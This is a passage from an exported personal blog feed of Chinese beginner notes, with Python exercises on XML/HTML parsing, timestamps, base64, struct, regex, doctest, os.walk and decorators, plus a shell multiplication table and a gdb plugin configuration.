class="string">'today'</span>]=&#123;<span class="string">'text'</span>:attrs[<span class="string">'text'</span>], <span class="string">'low'</span>:int(attrs[<span class="string">'low'</span>]), <span class="string">'high'</span>:int(attrs[<span class="string">'high'</span>])&#125;</span><br><span class="line">            <span class="keyword">if</span> day == <span class="number">2</span> :</span><br><span class="line">                weather_dict[<span class="string">'tomorrow'</span>]=&#123;<span class="string">'text'</span>:attrs[<span class="string">'text'</span>], <span class="string">'low'</span>:int(attrs[<span class="string">'low'</span>]), <span class="string">'high'</span>:int(attrs[<span class="string">'high'</span>])&#125;</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">end_element</span><span class="params">(self, name)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">char_data</span><span class="params">(self, text)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_weather</span><span class="params">(xml)</span>:</span></span><br><span class="line">    handler = WeatherSaxHandler()</span><br><span class="line">    parser = ParserCreate()</span><br><span class="line">    parser.StartElementHandler = handler.start_element</span><br><span class="line">    parser.CharacterDataHandler = handler.char_data</span><br><span class="line">    parser.EndElementHandler = handler.end_element</span><br><span class="line">    parser.Parse(xml)</span><br><span class="line">    <span class="keyword">return</span> weather_dict</span><br><span class="line"></span><br><span class="line">weather = parse_weather(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> weather[<span class="string">'city'</span>] == <span class="string">'Beijing'</span>, weather[<span class="string">'city'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> weather[<span class="string">'country'</span>] == <span class="string">'China'</span>, weather[<span class="string">'country'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> weather[<span class="string">'today'</span>][<span class="string">'text'</span>] == <span class="string">'Partly Cloudy'</span>,weather[<span class="string">'today'</span>][<span class="string">'text'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> weather[<span class="string">'today'</span>][<span class="string">'low'</span>] == <span class="number">20</span>, weather[<span class="string">'today'</span>][<span class="string">'low'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> weather[<span class="string">'today'</span>][<span class="string">'high'</span>] == <span class="number">33</span>, weather[<span class="string">'today'</span>][<span class="string">'high'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> weather[<span class="string">'tomorrow'</span>][<span class="string">'text'</span>] == <span class="string">'Sunny'</span>,weather[<span class="string">'tomorrow'</span>][<span class="string">'text'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> weather[<span class="string">'tomorrow'</span>][<span class="string">'low'</span>] == <span class="number">21</span>, weather[<span class="string">'tomorrow'</span>][<span class="string">'low'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> weather[<span class="string">'tomorrow'</span>][<span class="string">'high'</span>] == <span class="number">34</span>, weather[<span class="string">'tomorrow'</span>][<span class="string">'high'</span>]</span><br><span class="line"></span><br><span class="line">print(<span class="string">'Weather:'</span>, str(weather))</span><br></pre></td></tr></table></figure>

<h2 id="html解析"><a href="#html解析" class="headerlink" title="html解析"></a>html解析</h2><p><strong>找一个网页，例如 <a href="https://www.python.org/events/python-events/，用浏览器查看源码并复制，然后尝试解析一下" target="_blank" rel="noopener">https://www.python.org/events/python-events/，用浏览器查看源码并复制，然后尝试解析一下</a> HTML，输出 Python 官网发布的会议时间、名称和地点</strong></p>
<ul>
<li>代码抄别人的，不过懂了，自己打了一遍<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> html.parser <span class="keyword">import</span> HTMLParser</span><br><span class="line"><span class="keyword">from</span> html.entities <span class="keyword">import</span> name2codepoint</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyHTMLParser</span><span class="params">(HTMLParser)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        HTMLParser.__init__(self)</span><br><span class="line">        self.is_time = <span class="literal">False</span></span><br><span class="line">        self.is_title = <span class="literal">False</span></span><br><span class="line">        self.is_year = <span class="literal">False</span></span><br><span class="line">        self.is_location = <span class="literal">False</span></span><br><span class="line">        self.info = []</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_starttag</span><span class="params">(self, tag, attrs)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> tag == <span class="string">'time'</span>:</span><br><span class="line">            self.is_time = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> tag == <span class="string">'h3'</span> <span class="keyword">and</span> (<span class="string">'class'</span>, <span class="string">'event-title'</span>) <span class="keyword">in</span> attrs:</span><br><span class="line">            self.is_title = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> tag == <span class="string">'span'</span> <span class="keyword">and</span> (<span class="string">'class'</span>, <span class="string">'event-location'</span>) <span class="keyword">in</span> attrs:</span><br><span class="line">            self.is_location = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> tag == <span class="string">'span'</span> <span class="keyword">and</span> (<span class="string">'class'</span>, <span class="string">'say-no-more'</span>) <span class="keyword">in</span> attrs:</span><br><span class="line">            self.is_year = <span class="literal">True</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_data</span><span class="params">(self,data)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.is_time:</span><br><span class="line">            self.is_time = <span class="literal">False</span></span><br><span class="line">            mydict = &#123;<span class="string">'time'</span>:data&#125;</span><br><span class="line">            self.info.append(mydict)</span><br><span class="line">        <span class="keyword">if</span> self.is_title:</span><br><span class="line">            self.is_title = <span class="literal">False</span></span><br><span class="line">            mydict = &#123;<span class="string">'title'</span>:data&#125;</span><br><span class="line">            self.info.append(mydict)</span><br><span class="line">        <span class="keyword">if</span> self.is_location:</span><br><span class="line">            self.is_location = <span class="literal">False</span></span><br><span class="line">            mydict = &#123;<span class="string">'location'</span>:data&#125;</span><br><span class="line">            self.info.append(mydict)</span><br><span class="line">        <span class="keyword">if</span> self.is_year:</span><br><span class="line">            self.is_year = <span class="literal">False</span></span><br><span class="line">            mydict = &#123;<span class="string">'date'</span>:data&#125;</span><br><span class="line">            <span class="keyword">if</span> re.match(<span class="string">r'[0-9]'</span>,data.strip()):</span><br><span class="line">                self.info.append(mydict)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getinfo</span><span class="params">(data)</span>:</span></span><br><span class="line">    parser = MyHTMLParser()</span><br><span class="line">    parser.feed(data)</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> parser.info:</span><br><span class="line">        <span class="keyword">for</span> key <span class="keyword">in</span> x:</span><br><span class="line">            print(key + <span class="string">':'</span> + str(x[key]))</span><br><span class="line">        count = count + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> count % <span class="number">4</span> == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">print</span> (<span class="string">'--------------------------------'</span>)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'1.html'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    htmlcont = f.read()</span><br><span class="line">    getinfo(htmlcont)</span><br></pre></td></tr></table></figure>
</li>
</ul>
]]></content>
      <categories>
        <category>python基础</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>python-第六天学习</title>
    <url>/archives/undefined.html</url>
    <content><![CDATA[<h1 id="python3基础学习"><a href="#python3基础学习" class="headerlink" title="python3基础学习"></a>python3基础学习</h1><h2 id="时间库练习"><a href="#时间库练习" class="headerlink" title="时间库练习"></a>时间库练习</h2><p><strong>假设你获取了用户输入的日期和时间如 2015-1-21 9:01:30，以及一个时区信息如UTC+5:00，均是 str，请编写一个函数将其转换为 timestamp：</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime, timezone, timedelta</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">to_timestamp</span><span class="params">(dt_str, tz_str)</span>:</span></span><br><span class="line">----</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line">----</span><br><span class="line"><span class="comment"># 测试:</span></span><br><span class="line">t1 = to_timestamp(<span class="string">'2015-6-1 08:10:30'</span>, <span class="string">'UTC+7:00'</span>)</span><br><span class="line"><span class="keyword">assert</span> t1 == <span class="number">1433121030.0</span>, t1</span><br><span class="line">t2 = to_timestamp(<span class="string">'2015-5-31 16:10:30'</span>, <span class="string">'UTC-09:00'</span>)</span><br><span class="line"><span class="keyword">assert</span> t2 == <span class="number">1433121030.0</span>, t2</span><br><span class="line">print(<span class="string">'Pass'</span>)</span><br></pre></td></tr></table></figure><a id="more"></a>


<p>贴上我的代码，不难，不过我写的有点复杂了感觉</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime,timezone,timedelta</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">to_timestamp</span><span class="params">(info,where)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> isinstance(info,str) <span class="keyword">or</span> <span class="keyword">not</span> isinstance(where,str): <span class="comment">#用户错误输入处理</span></span><br><span class="line">        <span class="keyword">print</span> (<span class="string">"wrong input"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    now = datetime.strptime(info,<span class="string">"%Y-%m-%d %H:%M:%S"</span>) <span class="comment">#格式化时间</span></span><br><span class="line">    temp = re.match(<span class="string">r'^(UTC)([+-])([0-9]+):([0-9]+)'</span>,where).groups() <span class="comment">#正则匹配分割时间，应该有更简便的办法，我顺便练习下正则</span></span><br><span class="line">    temp = int(temp[<span class="number">1</span>]+temp[<span class="number">2</span>]) <span class="comment">#字符串转换成数字</span></span><br><span class="line">    now = now.replace(tzinfo=timezone(timedelta(hours=temp))) <span class="comment">#转换成带时区的时间</span></span><br><span class="line">    <span class="keyword">return</span> now.timestamp() <span class="comment">#转换成timestamp</span></span><br><span class="line"></span><br><span class="line">t1 = to_timestamp(<span class="string">'2015-6-1 08:10:30'</span>, <span class="string">'UTC+7:00'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> t1 == <span class="number">1433121030.0</span>, t1</span><br><span class="line"></span><br><span class="line">t2 = to_timestamp(<span class="string">'2015-5-31 16:10:30'</span>, <span class="string">'UTC-09:00'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> t2 == <span class="number">1433121030.0</span>, t2</span><br><span class="line"></span><br><span class="line">print(<span class="string">'Pass'</span>)</span><br></pre></td></tr></table></figure>

<h2 id="处理base64无等号版编码"><a href="#处理base64无等号版编码" class="headerlink" title="处理base64无等号版编码"></a>处理base64无等号版编码</h2><p><strong>请写一个能处理去掉=的 base64 解码函数：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">safe_base64_decode</span><span class="params">(s)</span>:</span></span><br><span class="line">----</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line">----</span><br><span class="line"><span class="comment"># 测试:</span></span><br><span class="line"><span class="keyword">assert</span> <span class="string">b'abcd'</span> == safe_base64_decode(<span class="string">b'YWJjZA=='</span>),</span><br><span class="line">safe_base64_decode(<span class="string">'YWJjZA=='</span>)</span><br><span class="line"><span class="keyword">assert</span> <span class="string">b'abcd'</span> == safe_base64_decode(<span class="string">b'YWJjZA'</span>),</span><br><span class="line">safe_base64_decode(<span class="string">'YWJjZA'</span>)</span><br><span class="line">print(<span class="string">'Pass'</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>题目不难。。然后我发觉题目给的测试是有误的，assert加逗号，后面那部分出错后是不会执行的，他的想法是对的，然而写法是错的</li>
<li>然后python3我代码没过，python2过了，具体细节待研究<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">safe_base64_decode</span><span class="params">(s)</span>:</span></span><br><span class="line">    length = len(s)</span><br><span class="line">    result = <span class="string">""</span></span><br><span class="line">    <span class="keyword">if</span> length%<span class="number">4</span> == <span class="number">0</span> :</span><br><span class="line">        result = base64.b64decode(s)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result = base64.b64decode(str(s) + (length%<span class="number">4</span>)*<span class="string">'='</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"><span class="keyword">assert</span> <span class="string">b'abcd'</span> == safe_base64_decode(<span class="string">b'YWJjZA=='</span>)</span><br><span class="line"></span><br><span class="line">safe_base64_decode(<span class="string">'YWJjZA=='</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="string">b'abcd'</span> == safe_base64_decode(<span class="string">b'YWJjZA'</span>)</span><br><span class="line"></span><br><span class="line">safe_base64_decode(<span class="string">'YWJjZA'</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">'Pass'</span>)</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="struct的使用"><a href="#struct的使用" class="headerlink" title="struct的使用"></a>struct的使用</h2><p><strong>练习：请编写一个 bmpinfo.py，可以检查任意文件是否是位图文件，如果是，打印出图片大小和颜色数。</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">judge</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(filename,<span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read(<span class="number">30</span>)</span><br><span class="line">    temp = struct.unpack(<span class="string">'&lt;ccIIIIIIHH'</span>,data)</span><br><span class="line">    <span class="keyword">if</span> temp[<span class="number">0</span>] == <span class="string">'B'</span> <span class="keyword">and</span> (temp[<span class="number">1</span>]==<span class="string">'M'</span> <span class="keyword">or</span> temp[<span class="number">1</span>]==<span class="string">'A'</span>):</span><br><span class="line">        print(<span class="string">'size :&#123;&#125;*&#123;&#125;,color:&#123;&#125;'</span>.format(temp[<span class="number">6</span>],temp[<span class="number">7</span>],temp[<span class="number">9</span>]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">'wrong file'</span>)</span><br><span class="line"></span><br><span class="line">judge(<span class="string">'1.py'</span>)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>python基础</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>shell-1</title>
    <url>/archives/undefined.html</url>
    <content><![CDATA[<h1 id="shell脚本学习"><a href="#shell脚本学习" class="headerlink" title="shell脚本学习"></a>shell脚本学习</h1><h2 id="九九乘法表"><a href="#九九乘法表" class="headerlink" title="九九乘法表"></a>九九乘法表</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> `seq 9`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> `seq <span class="variable">$n</span>`</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">        <span class="built_in">echo</span> -n <span class="string">"<span class="variable">$m</span>*<span class="variable">$n</span>="</span>`expr <span class="variable">$m</span> \* <span class="variable">$n</span>`<span class="string">"   "</span>  </span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line">    <span class="built_in">echo</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>shell基础</category>
      </categories>
      <tags>
        <tag>shell脚本</tag>
      </tags>
  </entry>
  <entry>
    <title>python-第五天学习</title>
    <url>/archives/undefined.html</url>
    <content><![CDATA[<h1 id="python3基础学习"><a href="#python3基础学习" class="headerlink" title="python3基础学习"></a>python3基础学习</h1><h2 id="正则学习"><a href="#正则学习" class="headerlink" title="正则学习"></a>正则学习</h2><p><strong>练习题：请尝试写一个验证 Email 地址的正则表达式。版本一应该可以验证出类似的 Email：</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">re.match(<span class="string">r'^([0-9a-zA-Z\_\.]+)@([0-9a-zA-Z\_]+).([a-zA-Z]+)'</span>,<span class="string">'bill.gates@microsoft.com'</span>).groups()</span><br></pre></td></tr></table></figure><a id="more"></a>


<p><strong>版本二可以验证并提取出带名字的 Email 地址：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">re.match(<span class="string">r'^(&lt;[a-zA-Z\s]+&gt;)\s([0-9a-zA-Z\_\.\&lt;\&gt;]+)@([0-9a-zA-Z\_]+).([a-zA-Z]+)'</span>,<span class="string">'&lt;Tom Paris&gt; tom@voyager.org'</span>).groups()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>python基础</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>gdb_config</title>
    <url>/archives/undefined.html</url>
    <content><![CDATA[<p>在不久前，我很讨厌gdb这种调试器，在windows下熟悉了ollydbg的我，遇上了纯命令的gdb调试器很是费劲，所以我前段时间研究了下gdb的插件peda，pwndbg(专用于pwn)，gef这些个插件，网上你可以去找教程，那些教程都是说如何切换三个调试器，而我的重点是 <strong>三个插件如何一起使用</strong></p><h1 id="如何同时使用gef-pwndbg-peda三个插件？"><a href="#如何同时使用gef-pwndbg-peda三个插件？" class="headerlink" title="如何同时使用gef,pwndbg,peda三个插件？"></a>如何同时使用gef,pwndbg,peda三个插件？</h1><a id="more"></a>
<p>我研究了一番gdbinit的这份文件，有人说，这不就是几个source吗，有什么好研究的？确实如此，gdbinit里就是几个环境变量的配置，然而用不用的好就是另一回事了，经过我一番推敲，发觉这份配置是不会出错的配置，可以同时使用三个插件，下面先贴上gdbinit部分配置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span> ~/.pwndbg/gdbinit.py</span><br><span class="line"><span class="built_in">source</span> ~/.peda/peda.py</span><br><span class="line"><span class="built_in">source</span> ~/.gdbinit-gef.py</span><br></pre></td></tr></table></figure>
<p>这个顺序不要调换，调换后会报错，具体pwndbg和peda和gef的安装，我就不教了，如果这个都不会，你装三个插件折腾个啥，一个插件就够你用了，有人看不懂这几句话，我也没办法，你照着改就好了。</p>
]]></content>
      <categories>
        <category>二进制</category>
        <category>调试器</category>
      </categories>
      <tags>
        <tag>gdb</tag>
      </tags>
  </entry>
  <entry>
    <title>python-第四天学习</title>
    <url>/archives/undefined.html</url>
    <content><![CDATA[<h1 id="python3基础学习"><a href="#python3基础学习" class="headerlink" title="python3基础学习"></a>python3基础学习</h1><h2 id="模块测试"><a href="#模块测试" class="headerlink" title="模块测试"></a>模块测试</h2><p>这部分没有例子，我也就没去写了，总的来说可以测试数据的合理性，没有通过模块测试一定有bug，不过你模块测试都写错了，那就没得说了</p><h2 id="文档测试"><a href="#文档测试" class="headerlink" title="文档测试"></a>文档测试</h2><p>练习：对函数 fact(n)编写 doctest 并执行：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fact</span><span class="params">(n)</span>:</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">----</span></span><br><span class="line"><span class="string">----</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">    <span class="keyword">if</span> n &lt; <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError()</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> n * fact(n - <span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">import</span> doctest</span><br><span class="line">    doctest.testmod()</span><br></pre></td></tr></table></figure><a id="more"></a>


<ul>
<li>上述为题目简介</li>
</ul>
<p>贴上代码，简单：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fact</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; fact(1)</span></span><br><span class="line"><span class="string">    1</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; fact(2)</span></span><br><span class="line"><span class="string">    2</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; fact(3)</span></span><br><span class="line"><span class="string">    6</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; fact(4)</span></span><br><span class="line"><span class="string">    24</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="keyword">if</span> n &lt; <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError()</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> n * fact(n<span class="number">-1</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>文档测试可以用来做实例，还可以测试数据的正确性，不过不要跟我一样写有规律的测试，写一些随机取数测试</li>
</ul>
<h2 id="os输入输出流部分"><a href="#os输入输出流部分" class="headerlink" title="os输入输出流部分"></a>os输入输出流部分</h2><p>感觉跟c的读写文件都差不多，附上练习部分解答</p>
<ol>
<li>利用 os 模块编写一个能实现 dir -l 输出的程序**</li>
</ol>
<ul>
<li>dir -1就是将每个文件包括目录按每行一个列出来，不包括隐藏文件<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dir1</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> os.listdir(<span class="string">'.'</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> f.startswith(<span class="string">'.'</span>):</span><br><span class="line">            <span class="keyword">print</span> f</span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="2">
<li>编写一个程序，能在当前目录以及当前目录的所有子目录下查找文件名包含指定字符串的文件，并打印出相对路径。</li>
</ol>
<ul>
<li>这题也不难，说实话一开头还不会写，找了点参考文章后才会写</li>
</ul>
<p><strong>参考文章内容：</strong></p>
<ul>
<li><p>os.walk(path)遍历path，返回一个对象，</p>
</li>
<li><p>他的每个部分都是一个三元组(‘目录x’，[目录x下的目录list]，目录x下面的文件)</p>
</li>
<li><p>eg:for root ,dirs,files in os.walk(path):  #os.walk返回的是一个三元组:根目录,文件列表，文件名</p>
</li>
<li><p>举例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = os.walk(<span class="string">'.'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line"><span class="keyword">print</span> i</span><br><span class="line">输出：</span><br><span class="line">(<span class="string">'.'</span>, [<span class="string">'abc'</span>, <span class="string">'temp'</span>], [<span class="string">'path0704.py'</span>, <span class="string">'\xc2\xb7\xbe\xb6\xcf\xe0\xb9\xd8\xd1\xa7\xcf\xb0.txt'</span>])</span><br><span class="line">(<span class="string">'.\\abc'</span>, [], [<span class="string">'\xd0\xc2\xbd\xa8 BMP \xcd\xbc\xcf\xf1.bmp'</span>])</span><br><span class="line">(<span class="string">'.\\temp'</span>, [<span class="string">'temp1'</span>], [<span class="string">'temp.h'</span>])</span><br><span class="line">(<span class="string">'.\\temp\\temp1'</span>, [], [<span class="string">'abc.bmp'</span>])</span><br></pre></td></tr></table></figure></li>
<li><p><strong>下面贴上我的代码</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Findfile</span><span class="params">(name)</span>:</span></span><br><span class="line">    myos = os.walk(<span class="string">'.'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> myos:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> i[<span class="number">2</span>]:</span><br><span class="line">            <span class="keyword">if</span> <span class="number">0</span> == j.find(name):</span><br><span class="line">                <span class="keyword">print</span> i[<span class="number">0</span>] + j</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    Findfile(<span class="string">'1.py'</span>)</span><br></pre></td></tr></table></figure>
</li>
</ul>
]]></content>
      <categories>
        <category>python基础</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>python-第三天学习</title>
    <url>/archives/undefined.html</url>
    <content><![CDATA[<h1 id="python3基础学习"><a href="#python3基础学习" class="headerlink" title="python3基础学习"></a>python3基础学习</h1><h2 id="装饰器"><a href="#装饰器" class="headerlink" title="装饰器"></a>装饰器</h2><p>装饰器原来感觉不好理解，这不就是函数嘛，为啥叫装饰器，在知乎上看到的解释还蛮不错的，就是原来有个东西，只有基础的部件，通过添加一些新东西过后，他就变成一个高级的部件</p><p><strong>题目练习：请编写一个 decorator，能在函数调用的前后打印出’begin call’和’end call’的日志</strong></p><a id="more"></a>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">log</span><span class="params">(func)</span>:</span></span><br><span class="line"><span class="meta">    @functools.wraps(func)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args,**kw)</span>:</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"call start"</span></span><br><span class="line">        func(*args,**kw)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"call end"</span></span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br></pre></td></tr></table></figure>

<p><strong>思考题：再思考一下能否写出一个@log的decorator，使它既支持：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@log</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">又支持：</span><br><span class="line"><span class="meta">@log('execute')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<p>经过测试，是不可以的，先贴上我的代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">log</span><span class="params">(text = <span class="string">'execute'</span>)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decorator</span><span class="params">(func)</span>:</span></span><br><span class="line"><span class="meta">        @functools.wraps(func)</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args,**kw)</span>:</span></span><br><span class="line">            func(*args,**kw)</span><br><span class="line">        <span class="keyword">return</span> wrapper</span><br><span class="line">    <span class="keyword">return</span> decorator</span><br><span class="line"></span><br><span class="line"><span class="meta">@log('execute')</span></span><br><span class="line"><span class="comment">#@log</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">now</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"a+b is :&#123;&#125;,&#123;&#125;"</span>.format(a+b,a-b)</span><br><span class="line"></span><br><span class="line">now(<span class="number">1</span>,<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
<p><strong><big>理由如下：</big></strong></p>
<p>我以为利用默认参数可以，可报错出现了，显示的是<strong>decorator take exactly 1 arguements(2 given)</strong> 仔细分析一下可以知道@log(‘execute’)是执行完最外层的return了，到了decorator这层，这次就是now = decorator(now),而如果我用@log的话，就是now = log(now),这样明显会出错，无法将函数传到第二层的装饰器部分，即使有默认参数，他也只将now当作你传入的参数，也就是text进行执行，然后这样执行下来的结果就变成decorator(1,2)错误的做法</p>
<p><strong>练习题：请利用@property 给一个 Screen 对象加上width和height属性，以及一个只读属性 resolution</strong></p>
